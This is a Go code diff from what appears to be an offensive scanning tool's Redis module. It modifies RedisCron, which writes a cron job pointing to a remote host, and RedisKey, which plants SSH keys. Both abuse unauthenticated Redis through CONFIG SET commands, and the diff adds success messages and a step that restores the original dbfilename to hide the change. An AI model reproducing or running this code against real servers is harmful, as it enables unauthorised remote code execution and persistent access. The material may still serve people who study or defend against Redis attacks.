@@ -290,8 +290,8 @@ func RedisExec(conn net.Conn, cmd string) {
 }
 
 func RedisCron(conn net.Conn, RemoteHost string) (bool, error) {
-	c, s, e := RedisWrite(conn)
-	Println(fmt.Sprintf("%v %v %v", c, s, e))
+	c, s, _ := RedisWrite(conn)
+	Println(fmt.Sprintf("[+] Redis cron %v ssh %v", c, s))
 	// 先解析RemoteHost参数
 	var (
 		remote = strings.Split(RemoteHost, ":")
@@ -344,8 +344,21 @@ func RedisCron(conn net.Conn, RemoteHost string) (bool, error) {
 					return false, err
 				}
 				if strings.Contains(reply, "OK") {
+					Println("[+] save corn success")
 					flag = true
 				}
+			}
+			// 恢复原始的dbfilename
+			_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename dump.rdb\r\n")))
+			if err != nil {
+				return false, err
+			}
+			reply, err = RedisReply(conn)
+			if err != nil {
+				return false, err
+			}
+			if strings.Contains(reply, "OK") {
+				Println("[+] Restore the original dbfilename")
 			}
 		}
 	}
@@ -402,6 +415,18 @@ func RedisKey(conn net.Conn, filename string) (bool, error) {
 				if strings.Contains(reply, "OK") {
 					flag = true
 				}
+			}
+			// 恢复原始的dbfilename
+			_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename dump.rdb\r\n")))
+			if err != nil {
+				return false, err
+			}
+			reply, err = RedisReply(conn)
+			if err != nil {
+				return false, err
+			}
+			if strings.Contains(reply, "OK") {
+				Println("[+] Restore the original dbfilename")
 			}
 		}
 	}
